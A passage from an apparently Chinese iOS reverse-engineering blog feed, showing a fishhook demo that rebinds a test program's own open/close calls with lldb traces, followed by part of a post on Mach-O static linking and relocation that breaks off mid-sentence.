class="built_in">printf</span>(<span class="string">&quot;Calling real close(%d)\\n&quot;</span>, fd);</span><br><span class="line">  <span class="keyword">return</span> orig_close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">int</span> oflag, ...)</span> </span>&#123;</span><br><span class="line">  va_list ap = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">mode_t</span> mode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((oflag &amp; O_CREAT) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// mode only applies to O_CREAT</span></span><br><span class="line">    va_start(ap, oflag);</span><br><span class="line">    mode = va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling real open(&#x27;%s&#x27;, %d, %d)\\n&quot;</span>, path, oflag, mode);</span><br><span class="line">    <span class="keyword">return</span> orig_open(path, oflag, mode);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling real open(&#x27;%s&#x27;, %d)\\n&quot;</span>, path, oflag);</span><br><span class="line">    <span class="keyword">return</span> orig_open(path, oflag, mode);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      getchar();</span><br><span class="line">    rebind_symbols((struct rebinding[<span class="number">2</span>])&#123;&#123;<span class="string">&quot;close&quot;</span>, my_close, (<span class="keyword">void</span> *)&amp;orig_close&#125;, &#123;<span class="string">&quot;open&quot;</span>, my_open, (<span class="keyword">void</span> *)&amp;orig_open&#125;&#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open our own binary and print out first 4 bytes (which is the same</span></span><br><span class="line">    <span class="comment">// for all Mach-O binaries on a given architecture)</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(argv[<span class="number">0</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">uint32_t</span> magic_number = <span class="number">0</span>;</span><br><span class="line">    read(fd, &amp;magic_number, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Mach-O Magic Number: %x \\n&quot;</span>, magic_number);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;%</span><br><span class="line"> ~/study/ios_re_link/fishhook  cat Makefile</span><br><span class="line">all:</span><br><span class="line">    xcrun -sdk iphoneos clang main.c fishhook.c -o main -target arm64-apple-ios12<span class="number">.2</span></span><br><span class="line">    codesign -s <span class="string">&quot;A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455&quot;</span> --entitlements entitlements.xml -f main</span><br><span class="line"></span><br><span class="line">push:</span><br><span class="line">    scp main root@<span class="number">10.2</span><span class="number">.5</span><span class="number">.0</span>:/tmp</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">    rm main</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3f6ac</span> main`rebind_symbols_for_image(rebindings=<span class="number">0x00000001012005b0</span>, header=<span class="number">0x0000000100a38000</span>, slide=<span class="number">10715136</span>) at fishhook.c:<span class="number">187</span>:<span class="number">8</span></span><br><span class="line">   <span class="number">184</span>         &#125;</span><br><span class="line">   <span class="number">185</span>       &#125;</span><br><span class="line">   <span class="number">186</span></span><br><span class="line">-&gt; <span class="number">187</span>       <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">   <span class="number">188</span>           !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">   <span class="number">189</span>         <span class="keyword">return</span>;</span><br><span class="line">   <span class="number">190</span>       &#125;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) po symtab_cmd</span><br><span class="line"><span class="number">0x0000000100a38440</span></span><br><span class="line"></span><br><span class="line">(lldb) po dysymtab_cmd</span><br><span class="line"><span class="number">0x0000000100a38458</span></span><br><span class="line"></span><br><span class="line">(lldb) po linkedit_segment</span><br><span class="line"><span class="number">0x0000000100a383c8</span></span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>然后找到 <code>LC_SEGMENT_64_DATA</code> 处理 <code>S_LAZY_SYMBOL_POINTERS</code> 和 <code>S_NON_LAZY_SYMBOL_POINTERS</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n</span><br><span class="line">Process <span class="number">2046</span> stopped</span><br><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3f828</span> main`rebind_symbols_for_image(rebindings=<span class="number">0x00000001012005b0</span>, header=<span class="number">0x0000000100a38000</span>, slide=<span class="number">10715136</span>) at fishhook.c:<span class="number">215</span>:<span class="number">42</span></span><br><span class="line">   <span class="number">212</span>               perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">   <span class="number">213</span>             &#125;</span><br><span class="line">   <span class="number">214</span>             <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">-&gt; <span class="number">215</span>               perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">   <span class="number">216</span>             &#125;</span><br><span class="line">   <span class="number">217</span>           &#125;</span><br><span class="line">   <span class="number">218</span>         &#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/seg.png" alt="seg"></p><p>这里为了调试，重点关注 <code>S_LAZY_SYMBOL_POINTERS</code> 的处理</p><p>首先在rebind之前查看open符号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(lldb) image lookup -va <span class="number">0x0000000100a3fee0</span></span><br><span class="line">      Address: main[<span class="number">0x0000000100007ee0</span>] (main.__TEXT.__stub_helper + <span class="number">180</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">&quot;/private/var/tmp/main&quot;</span>, arch = <span class="string">&quot;arm64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">Process <span class="number">2046</span> resuming</span><br><span class="line">Process <span class="number">2046</span> stopped</span><br><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = breakpoint <span class="number">4.1</span></span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3fbc8</span> main`perform_rebinding_with_section(rebindings=<span class="number">0x00000001012005b0</span>, section=<span class="number">0x0000000100a382d8</span>, slide=<span class="number">10715136</span>, symtab=<span class="number">0x0000000100a44210</span>, strtab=<span class="string">&quot; &quot;</span>, indirect_symtab=<span class="number">0x0000000100a44780</span>) at fishhook.c:<span class="number">135</span>:<span class="number">46</span></span><br><span class="line">   <span class="number">132</span>                 <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="number">133</span>               <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">   <span class="number">134</span>                   indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">-&gt; <span class="number">135</span>                 *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">   <span class="number">136</span>               &#125;</span><br><span class="line">   <span class="number">137</span>               indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">   <span class="number">138</span>               <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) <span class="function">p <span class="title">symbol_name</span></span></span><br><span class="line"><span class="function"><span class="params">(<span class="keyword">char</span> *)</span> $20 </span>= <span class="number">0x0000000100a44937</span> <span class="string">&quot;_open&quot;</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>首先备份了原函数地址，确保hook后可以通过 <code>orign_open</code>调用到原本的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(lldb) <span class="function">p <span class="title">i</span></span></span><br><span class="line"><span class="function"><span class="params">(uint)</span> $24 </span>= <span class="number">13</span></span><br><span class="line">(lldb) po indirect_symbol_bindings[<span class="number">13</span>]</span><br><span class="line"><span class="number">0x0000000100a3fee0</span></span><br><span class="line"></span><br><span class="line">(lldb) image lookup -va <span class="number">0x0000000100a3fee0</span></span><br><span class="line">      Address: main[<span class="number">0x0000000100007ee0</span>] (main.__TEXT.__stub_helper + <span class="number">180</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">&quot;/private/var/tmp/main&quot;</span>, arch = <span class="string">&quot;arm64&quot;</span></span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>之后找到函数指针，完成替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Process 2046 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = &#x27;com.apple.main-thread&#x27;, stop reason = step over</span></span><br><span class="line">    frame <span class="comment">#0: 0x0000000100a3fbfc main`perform_rebinding_with_section(rebindings=0x00000001012005b0, section=0x0000000100a382d8, slide=10715136, symtab=0x0000000100a44210, strtab=&quot; &quot;, indirect_symtab=0x0000000100a44780) at fishhook.c:137:41</span></span><br><span class="line">   134                   indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">   135                 *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">   136               &#125;</span><br><span class="line">-&gt; 137               indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">   138               goto symbol_loop;</span><br><span class="line">   139             &#125;</span><br><span class="line">   140           &#125;</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) image list |grep main</span><br><span class="line">[  0] EAE1AE51-465A-32E0-8B3F-195FE2480F4F 0x0000000100a38000 /private/var/tmp/main</span><br><span class="line">      /System/Volumes/Data/Users/muhe/study/ios_re_link/fishhook/main.dSYM/Contents/Resources/DWARF/main(0x0000000100a38000)</span><br><span class="line">(lldb)</span><br><span class="line">(lldb) x/20gx indirect_symbol_bindings</span><br><span class="line">0x100a40018: 0x00000001d8642a68 0x0000000100a3fe50</span><br><span class="line">0x100a40028: 0x0000000100a3fe5c 0x0000000100a3fe68</span><br><span class="line">0x100a40038: 0x0000000100a3fe74 0x00000001d8581374</span><br><span class="line">0x100a40048: 0x0000000100a3f224 0x00000001d8581694</span><br><span class="line">0x100a40058: 0x0000000100a3fea4 0x00000001d860ae30</span><br><span class="line">0x100a40068: 0x00000001d871060c 0x00000001d873dd30</span><br><span class="line">0x100a40078: 0x0000000100a3fed4 0x0000000100a3f270</span><br><span class="line">0x100a40088: 0x0000000100a3feec 0x0000000100a3fef8</span><br><span class="line">0x100a40098: 0x00000001d873dfd0 0x0000000100a3ff10</span><br><span class="line">0x100a400a8: 0x0000000100d04498 0x0000000100a3ff72</span><br><span class="line">(lldb) x/gx 0x100a40078+8</span><br><span class="line">0x100a40080: 0x0000000100a3f270</span><br><span class="line">(lldb)</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">&gt;&gt;&gt; hex(0x100a40080-0x0000000100a38000)</span><br><span class="line"><span class="string">&#x27;0x8080&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/func_ptr.png" alt="func_ptr"></p><p>如果调用 原本的函数会走什么流程？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x100a3f448</span> &lt;+<span class="number">176</span>&gt;: bl     <span class="number">0x100a3fd9c</span>               ; symbol stub <span class="keyword">for</span>: close</span><br><span class="line">-&gt;  <span class="number">0x100a3f44c</span> &lt;+<span class="number">180</span>&gt;: adrp   x8, <span class="number">1</span></span><br><span class="line">    <span class="number">0x100a3f450</span> &lt;+<span class="number">184</span>&gt;: ldr    x8, [x8]</span><br><span class="line">    <span class="number">0x100a3f454</span> &lt;+<span class="number">188</span>&gt;: ldr    x8, [x8]</span><br><span class="line">    <span class="number">0x100a3f458</span> &lt;+<span class="number">192</span>&gt;: ldur   x10, [x29, #<span class="number">-0x8</span>]</span><br><span class="line">    <span class="number">0x100a3f45c</span> &lt;+<span class="number">196</span>&gt;: subs   x8, x8, x10</span><br><span class="line">    <span class="number">0x100a3f460</span> &lt;+<span class="number">200</span>&gt;: b.ne   <span class="number">0x100a3f478</span>               ; &lt;+<span class="number">224</span>&gt; at main.c</span><br><span class="line">    <span class="number">0x100a3f464</span> &lt;+<span class="number">204</span>&gt;: mov    w8, #<span class="number">0x0</span></span><br><span class="line">    <span class="number">0x100a3f468</span> &lt;+<span class="number">208</span>&gt;: mov    x0, x8</span><br><span class="line">    <span class="number">0x100a3f46c</span> &lt;+<span class="number">212</span>&gt;: ldp    x29, x30, [sp, #<span class="number">0x70</span>]</span><br><span class="line">    <span class="number">0x100a3f470</span> &lt;+<span class="number">216</span>&gt;: add    sp, sp, #<span class="number">0x80</span>             ; =<span class="number">0x80</span></span><br><span class="line">    <span class="number">0x100a3f474</span> &lt;+<span class="number">220</span>&gt;: ret</span><br><span class="line">    <span class="number">0x100a3f478</span> &lt;+<span class="number">224</span>&gt;: bl     <span class="number">0x100a3fd60</span>               ; symbol stub <span class="keyword">for</span>: __stack_chk_fail</span><br><span class="line">(lldb) dis -a <span class="number">0x100a3fd9c</span></span><br><span class="line">main`close:</span><br><span class="line">    <span class="number">0x100a3fd9c</span> &lt;+<span class="number">0</span>&gt;: nop</span><br><span class="line">    <span class="number">0x100a3fda0</span> &lt;+<span class="number">4</span>&gt;: ldr    x16, #<span class="number">0x2a8</span>               ; (<span class="keyword">void</span> *)<span class="number">0x0000000100a3f224</span>: my_close at /Users/muhe/study/ios_re_link/fishhook/main.c:<span class="number">10</span></span><br><span class="line">    <span class="number">0x100a3fda4</span> &lt;+<span class="number">8</span>&gt;: br     x16</span><br></pre></td></tr></table></figure><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><a href="https://github.com/facebook/fishhook">https://github.com/facebook/fishhook</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;关于&quot;&gt;&lt;a href=&quot;#关于&quot; class=&quot;headerlink&quot; title=&quot;关于&quot;&gt;&lt;/a&gt;关于&lt;/h1&gt;&lt;p&gt;Fishhook是Facebook提供的利用MachO文件惰性加载原理，通过修改懒加载和非懒加载两个表的指针达到C函数HOOK的目的一个轻量级的hook库。理解这个工具和熟悉流程也是可以帮助更好的理解MachO文件格式 :)&lt;/p&gt;</summary>
    
    
    
    
    <category term="RE" scheme="http://o0xmuhe.me/tags/RE/"/>
    
    <category term="iOS" scheme="http://o0xmuhe.me/tags/iOS/"/>
    
    <category term="fishhook" scheme="http://o0xmuhe.me/tags/fishhook/"/>
    
  </entry>
  
  <entry>
    <title>iOS RE 4 beginners 2 - 静态链接&amp;&amp;动态链接</title>
    <link href="http://o0xmuhe.me/2021/07/14/iOS-RE-4-beginners-2/"/>
    <id>http://o0xmuhe.me/2021/07/14/iOS-RE-4-beginners-2/</id>
    <published>2021-07-14T09:15:47.000Z</published>
    <updated>2021-07-20T08:08:05.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h1><p>macos11.4 + iphone6 iOS 12.2</p><a id="more"></a><h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><p>静态链接：输入多个目标文件，输出一个文件（一般是可执行文件）。这个过程中，把多个目标文件里相同性质的段合并到一起。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul><li>地址和空间分配 (Address and Storage Allocation)</li><li>符号决议 (Symbol Resolution) / 符号绑定 (Symbol Binding)</li><li>重定位 (Relocation)</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled.png"></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~/study/ios_re_link/static_link  cat main.c</span><br><span class="line"></span><br><span class="line">extern int global_var;</span><br><span class="line"></span><br><span class="line">int foo(int i);</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">    int ret = foo(42 + global_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> ~/study/ios_re_link/static_link  cat foo.c</span><br><span class="line">int global_var = 0x1337;</span><br><span class="line"></span><br><span class="line">int foo(int i)&#123;</span><br><span class="line">    <span class="built_in">return</span> i + global_var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/study/ios_re_link/static_link  xcrun -sdk iphoneos clang -c main.c foo.c -target arm64-apple-ios12.2</span><br><span class="line">~/study/ios_re_link/static_link  xcrun -sdk iphoneos clang main.o foo.o -o main -target arm64-apple-ios12.2</span><br></pre></td></tr></table></figure><p>两个模块(main.o 和 foo.o) 通过静态链接组合成了一个可执行文件(main)</p><h2 id="模块-amp-amp-产物"><a href="#模块-amp-amp-产物" class="headerlink" title="模块&amp;&amp;产物"></a>模块&amp;&amp;产物</h2><h3 id="main-o"><a href="#main-o" class="headerlink" title="main.o"></a>main.o</h3><p>通过machoview可以看到重定位段有三条信息，意味着程序中有三处需要重定位处理：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%201.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%201.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%202.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%202.png"></p><p>这个图是hopper反汇编的main函数，可以看到对于引用到其他模块(foo.o)重的变量/函数的地方看起来“正常”，但是点击 <code>bl _foo</code> 就会发现跳转到了：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%203.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%203.png"></p><p>根据&lt;macho/reloc.h&gt;的定义，可以看到reloc段的结构：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct relocation_info &#123;</span><br><span class="line">   int32_t    r_address;    /* offset <span class="keyword">in</span> the section to what is being</span><br><span class="line">                   relocated */</span><br><span class="line">   uint32_t     r_symbolnum:24,    /* symbol index <span class="keyword">if</span> r_extern == 1 or section</span><br><span class="line">                   ordinal <span class="keyword">if</span> r_extern == 0 */</span><br><span class="line">        r_pcrel:1,     /* was relocated pc relative already */</span><br><span class="line">        r_length:2,    /* 0=byte, 1=word, 2=long, 3=quad */</span><br><span class="line">        r_extern:1,    /* does not include value of sym referenced */</span><br><span class="line">        r_type:4;    /* <span class="keyword">if</span> not 0, machine specific relocation <span class="built_in">type</span> */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结合上面的图来看(以_foo符号为例)：</p><ul><li>r_address : 0x28</li><li>r_symbolnum(24bits): 指向_foo 字符串</li><li>剩下的8bits是标志位</li></ul><p>对应到汇编里就是，main函数的0x28行引用了 _foo 符号，reloc段把这个信息告知linker，这样在链接的时候linker就会处理这条信息，把对应的符号做替换处理。</p><h3 id="foo-o"><a href="#foo-o" class="headerlink" title="foo.o"></a>foo.o</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%204.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%204.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%205.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%205.png"></p><p>其实都是对 <code>global_var</code>的引用</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%206.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%206.png"></p><p>在foo.o模块中，是 0x20处的data，这个信息也要告诉linker，在link的阶段做替换。</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>最终的可执行文件main，可以看到没有重定位信息，而且mian和foo函数中改替换的符号都已经完成了替换，可以顺利的索引到想要使用的符号(foo和global_var)。</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%207.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%207.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%208.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%208.png"></p><p>对比两者符号表：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%209.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%209.png"></p><p>以foo符号为例 : </p><p>Type 从 N_UNDF → NSECT</p><p>Value 从0 → 0x100007f90 </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.17.57@2x.png" alt="CleanShot 2021-07-20 at 15.17.57@2x"></p><p>符号表结构:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct nlist_64 &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        uint32_t n_strx;   /* index into the string table */</span><br><span class="line">    &#125; n_un;</span><br><span class="line">    uint8_t  n_type;       /* <span class="built_in">type</span> flag, see below */</span><br><span class="line">    uint8_t  n_sect;       /* section number or NO_SECT */</span><br><span class="line">    uint16_t n_desc;       /* see &lt;mach-o/stab.h&gt; */</span><br><span class="line">    uint64_t n_value;      /* value of this symbol (or stab offset) */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>foo 符号的话</p><ul><li>string table index : 指向符号的字符串</li><li>n_sect : 改符号在第几个section</li><li>n_value : 符号具体值(地址)</li></ul><h2 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h2><p>这里以demo中 global_var 使用的代码举例子。</p><p>源码中:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ret = foo(42 + global_var);</span><br></pre></td></tr></table></figure><p>如果对应到汇编里应该是:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0000000000000014         adrp       x9, <span class="comment">#0x0                                    ; 0x68@PAGE</span></span><br><span class="line">0000000000000018         ldr        x9, [x9, <span class="comment">#0x68]                             ; 0x68@PAGEOFF</span></span><br><span class="line">000000000000001c         ldr        w10, [x9]</span><br><span class="line">0000000000000020         add        w0, w10, <span class="comment">#0x2a</span></span><br><span class="line">0000000000000024         str        w8, [sp, <span class="comment">#0x10 + var_C]</span></span><br><span class="line">0000000000000028         bl         _foo</span><br></pre></td></tr></table></figure><p>可知 w0 